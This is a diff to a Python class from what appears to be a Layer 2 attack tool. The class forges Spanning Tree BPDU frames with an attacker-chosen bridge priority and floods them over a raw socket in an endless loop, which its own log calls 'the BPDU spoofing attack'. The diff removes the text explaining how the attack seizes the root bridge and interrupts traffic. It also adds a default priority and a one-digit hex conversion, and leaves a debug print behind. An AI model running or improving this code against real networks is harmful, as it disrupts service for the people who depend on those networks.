@@ -42,32 +42,24 @@ class BPDUPacket:
         :srcmac: your MAC-address (b"\xbb\xbb\xbb\xbb\xbb\xbb"
                                      == bb:bb:bb:bb:bb:bb)
         :dstmac: switch MAC-address
+        :priority: STP priority
         """
         self.interface = interface
         self.srcmac = make_valid_mac_address(srcmac)
         self.srcmac_str = srcmac
         self.dstmac = make_valid_mac_address(dstmac)
+        if priority is None:
+            priority = 8192
         self.priority = int(priority)
         if interface and srcmac and dstmac:
             _LOGGER.debug(
-                "Creating an BPDU packet with your interface %s,"
+                "Creating an BPDU packet with your interface %s, "
                 "source MAC %s and bridge MAC %s",
                 self.interface,
                 srcmac,
                 dstmac,
             )
-        self.description = dedent(
-            """\
-        On a Layer 2 network, switches running STP, RSTP, MSTP, or VBST
-        exchange BPDUs to calculate a spanning tree and trim the ring network
-        into a loop-free tree topology. If forged BPDUs are sent to attack a
-        device with edge ports and received by them, the device will
-        automatically change the edge ports to non-edge ports and recalculate
-        the spanning tree. If the bridge priority in the BPDUs sent by an
-        attacker is higher than the priority of the root bridge, the network
-        topology will change, thereby interrupting service traffic.
-        """
-        )
+            self.packet = self.create_packet()
 
     def _create_payload(self):
         """
@@ -116,12 +108,14 @@ class BPDUPacket:
         if priority % 4096 != 0:
             raise ValueError("Priority must be divisible by 4096")
 
-        converted_priority = str(int(priority / 4096 * 1000))  # 4096 -> 1000
+        # 4096 -> 1000
+        converted_priority = hex(int(priority / 4096))[2] + "000"
         str_bridge_id = converted_priority + mac.replace(":", "").replace(
             "-", ""
         )
         _LOGGER.debug("Set Bridge ID %s", converted_priority + "." + mac)
-        return unhexlify(str_bridge_id)
+        print(str_bridge_id)
+        return unhexlify(str_bridge_id.strip())
 
     def create_packet(self):
         """
@@ -137,12 +131,11 @@ class BPDUPacket:
             + pack(">H", len(llc_header) + len(self.payload))
             + llc_header
         )
-        self.packet = self.header + self.payload
+        return self.header + self.payload
 
-    def send_bpdu_packets(self):
-        """Send BPDU packets"""
+    def send_multiple_bpdu_packets(self):
+        """Send loads of BPDU packets"""
         _LOGGER.info("Running the BPDU spoofing attack. Press Ctrl+C to stop")
-        self.create_packet()
         sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
         sock.bind((self.interface, 0))
         while True:
